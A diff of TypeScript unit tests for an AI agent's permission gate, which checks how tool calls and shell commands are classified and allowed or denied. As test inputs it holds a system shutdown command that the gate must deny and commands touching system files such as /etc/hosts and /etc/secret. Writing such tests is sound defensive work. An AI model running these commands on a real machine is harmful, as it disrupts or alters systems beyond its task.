+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(external).toBeUndefined()
   })
 
@@ -1609,7 +1609,7 @@ describe("EnforcementGate path extraction — NON_PATH_PATTERNS", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "ls /usr/bin/gcc" })
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(external).toBeUndefined()
   })
 
@@ -1621,7 +1621,7 @@ describe("EnforcementGate path extraction — NON_PATH_PATTERNS", () => {
     // Anything containing :// should be filtered out of paths
     const result = gate.classify("bash", { command: "echo url https://example.com/page" })
     // The URL should not produce a file_external capability for the /page path
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     if (external) {
       expect(external.paths).not.toContain("https://example.com/page")
     }
@@ -1638,7 +1638,7 @@ describe("EnforcementGate extended path extraction", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "cat /etc/hosts" })
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(external).toBeDefined()
     expect(external.paths).toContain("/etc/hosts")
   })
@@ -1649,7 +1649,7 @@ describe("EnforcementGate extended path extraction", () => {
       workspaceType: "main",
     })
     const result = gate.classify("bash", { command: "cat data.txt", workdir: "/Users/test/my-project" })
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     // data.txt relative to workdir — inside workspace, shouldn't be external
     expect(external).toBeUndefined()
   })
@@ -1660,7 +1660,7 @@ describe("EnforcementGate extended path extraction", () => {
       workspaceType: "main",
     })
     const result = gate.classify("bash", { command: "mkdir -m 755 testdir", workdir: "/Users/test/my-project" })
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     // testdir is inside workspace, 755 is a flag value (skipped), no external
     if (external) {
       const paths = external.paths ?? []
@@ -1674,7 +1674,7 @@ describe("EnforcementGate extended path extraction", () => {
       workspaceType: "main",
     })
     const result = gate.classify("bash", { command: "chmod 755 file", workdir: "/Users/test/my-project" })
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     // file is inside workspace, 755 is numeric mode (skipped)
     if (external) {
       const paths = external.paths ?? []
@@ -1688,7 +1688,7 @@ describe("EnforcementGate extended path extraction", () => {
       workspaceType: "main",
     })
     const result = gate.classify("bash", { command: "chmod 755 /etc/secret" })
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(external).toBeDefined()
     expect(external.paths).toContain("/etc/secret")
     expect(external.paths).not.toContain(expect.stringMatching(/755$/))
@@ -1714,7 +1714,7 @@ describe("EnforcementGate extended path extraction", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "tee /tmp/output.log" })
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(external).toBeDefined()
     expect(external.paths).toContain("/tmp/output.log")
   })
@@ -1725,7 +1725,7 @@ describe("EnforcementGate extended path extraction", () => {
       workspaceType: "main",
     })
     const result = gate.classify("bash", { command: "ln -s /etc/hosts symlink", workdir: "/Users/test/my-project" })
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     // /etc/hosts is external
     expect(external).toBeDefined()
     expect(external.paths).toContain("/etc/hosts")
@@ -1737,7 +1737,7 @@ describe("EnforcementGate extended path extraction", () => {
       workspaceType: "main",
     })
     const result = gate.classify("bash", { command: "install /tmp/src /tmp/dst" })
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(external).toBeDefined()
   })
 
@@ -1748,7 +1748,7 @@ describe("EnforcementGate extended path extraction", () => {
     })
     const result = gate.classify("bash", { command: "node script.js", workdir: "/Users/test/my-project" })
     // script.js is inside workspace, should not produce file_external
-    const external = result.capabilities.find((c: any) => c.class === "file_external")
+    const external = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(external).toBeUndefined()
   })
 })
@@ -1783,9 +1783,9 @@ describe("EnforcementGate pipe-to-shell", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "ls | grep foo", workdir: "/Users/test/synergy-control-profile" })
-    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")
+    const destructive = result.capabilities.find((c: any) => c.class === "shell_destructive")!
     expect(destructive).toBeUndefined()
-    const shellRead = result.capabilities.find((c: any) => c.class === "shell_read")
+    const shellRead = result.capabilities.find((c: any) => c.class === "shell_read")!
     expect(shellRead).toBeDefined()
   })
 })
@@ -1802,7 +1802,7 @@ describe("EnforcementGate shell_hardline in gate", () => {
     })
     const envelope = gate.evaluate("bash", { command: "shutdown -h now" })
     expect(envelope.decision).toBe("deny")
-    const hardline = envelope.capabilities.find((c: any) => c.class === "shell_hardline")
+    const hardline = envelope.capabilities.find((c: any) => c.class === "shell_hardline")!
     expect(hardline).toBeDefined()
     expect(hardline.nonBypassable).toBe(true)
   })
@@ -1813,7 +1813,7 @@ describe("EnforcementGate shell_hardline in gate", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("bash", { command: "shutdown -h now" })
-    const hardline = result.capabilities.find((c: any) => c.class === "shell_hardline")
+    const hardline = result.capabilities.find((c: any) => c.class === "shell_hardline")!
     expect(hardline).toBeDefined()
     expect(hardline.nonBypassable).toBe(true)
   })
@@ -1857,7 +1857,7 @@ describe("EnforcementGate shell_hardline in gate", () => {
     })
     const envelope = gate.evaluate("bash", { command: "git log --oneline" })
     expect(envelope.decision).toBe("allow")
-    const shellRead = envelope.capabilities.find((c: any) => c.class === "shell_read")
+    const shellRead = envelope.capabilities.find((c: any) => c.class === "shell_read")!
     expect(shellRead).toBeDefined()
   })
 
@@ -1900,8 +1900,8 @@ describe("EnforcementGate shell_hardline in gate", () => {
     const envelope = gate.evaluate("bash", { command: "shutdown -h now" })
     expect(envelope.decision).toBe("deny")
     expect(envelope.refusal).toBeDefined()
-    expect(envelope.refusal.permanent).toBe(true)
-    expect(envelope.refusal.matchedPermission).toBe("shell_hardline")
+    expect(envelope.refusal!.permanent).toBe(true)
+    expect(envelope.refusal!.matchedPermission).toBe("shell_hardline")
   })
 })
 
@@ -1917,7 +1917,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("dagread", {})
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -1928,7 +1928,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("todoread", {})
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -1939,7 +1939,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("task_list", {})
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -1950,7 +1950,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("task_output", {})
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -1963,7 +1963,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("dagwrite", {})
-    const cap = result.capabilities.find((c: any) => c.class === "file_write")
+    const cap = result.capabilities.find((c: any) => c.class === "file_write")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -1974,7 +1974,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("dagpatch", {})
-    const cap = result.capabilities.find((c: any) => c.class === "file_write")
+    const cap = result.capabilities.find((c: any) => c.class === "file_write")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -1985,7 +1985,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("todowrite", {})
-    const cap = result.capabilities.find((c: any) => c.class === "file_write")
+    const cap = result.capabilities.find((c: any) => c.class === "file_write")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -1996,7 +1996,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("task", {})
-    const cap = result.capabilities.find((c: any) => c.class === "file_write")
+    const cap = result.capabilities.find((c: any) => c.class === "file_write")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2007,7 +2007,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("task_cancel", {})
-    const cap = result.capabilities.find((c: any) => c.class === "file_write")
+    const cap = result.capabilities.find((c: any) => c.class === "file_write")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2018,7 +2018,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("batch", { tool_calls: [{ tool: "read", parameters: { filePath: "src/test.ts" } }] })
-    const cap = result.capabilities.find((c: any) => c.class === "file_write")
+    const cap = result.capabilities.find((c: any) => c.class === "file_write")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2031,7 +2031,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("question", { questions: [] })
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2042,7 +2042,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("skill", { name: "frontend-design" })
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2053,7 +2053,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("render", {})
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2064,7 +2064,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("diagram", {})
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2077,7 +2077,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("agenda_list", {})
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2088,7 +2088,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("agenda_logs", { id: "test-id" })
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2103,7 +2103,7 @@ describe("EnforcementGate new tool classification", () => {
     const result = gate.classify("list", {
       filePath: "/Users/test/synergy-control-profile/src",
     })
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2117,7 +2117,7 @@ describe("EnforcementGate new tool classification", () => {
       pattern: "const $X = $Y",
       paths: ["/Users/test/synergy-control-profile/src"],
     })
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2131,7 +2131,7 @@ describe("EnforcementGate new tool classification", () => {
       pattern: "const $X = $Y",
       paths: ["/etc/config"],
     })
-    const cap = result.capabilities.find((c: any) => c.class === "file_external")
+    const cap = result.capabilities.find((c: any) => c.class === "file_external")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(true)
   })
@@ -2144,7 +2144,7 @@ describe("EnforcementGate new tool classification", () => {
     const result = gate.classify("lsp", {
       filePath: "/Users/test/synergy-control-profile/src/index.ts",
     })
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2157,7 +2157,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("process", { action: "list" })
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2168,7 +2168,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("process", { action: "poll" })
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2179,7 +2179,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("process", { action: "log" })
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2190,7 +2190,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("process", { action: "write" })
-    const cap = result.capabilities.find((c: any) => c.class === "shell")
+    const cap = result.capabilities.find((c: any) => c.class === "shell")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2201,7 +2201,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("process", { action: "send-keys" })
-    const cap = result.capabilities.find((c: any) => c.class === "shell")
+    const cap = result.capabilities.find((c: any) => c.class === "shell")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2212,7 +2212,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("process", { action: "kill" })
-    const cap = result.capabilities.find((c: any) => c.class === "shell")
+    const cap = result.capabilities.find((c: any) => c.class === "shell")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2223,7 +2223,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("process", { action: "clear" })
-    const cap = result.capabilities.find((c: any) => c.class === "shell")
+    const cap = result.capabilities.find((c: any) => c.class === "shell")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2234,7 +2234,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("process", { action: "remove" })
-    const cap = result.capabilities.find((c: any) => c.class === "shell")
+    const cap = result.capabilities.find((c: any) => c.class === "shell")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2247,7 +2247,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("connect", { action: "list" })
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2258,7 +2258,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("connect", { action: "status", envID: "env_abc123" })
-    const cap = result.capabilities.find((c: any) => c.class === "file_read")
+    const cap = result.capabilities.find((c: any) => c.class === "file_read")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(false)
   })
@@ -2269,7 +2269,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("connect", { action: "open", envID: "env_abc123" })
-    const cap = result.capabilities.find((c: any) => c.class === "network_request")
+    const cap = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(true)
   })
@@ -2280,7 +2280,7 @@ describe("EnforcementGate new tool classification", () => {
       workspaceType: "worktree",
     })
     const result = gate.classify("connect", { action: "close", envID: "env_abc123" })
-    const cap = result.capabilities.find((c: any) => c.class === "network_request")
+    const cap = result.capabilities.find((c: any) => c.class === "network_request")!
     expect(cap).toBeDefined()
     expect(cap.nonBypassable).toBe(true)
   })
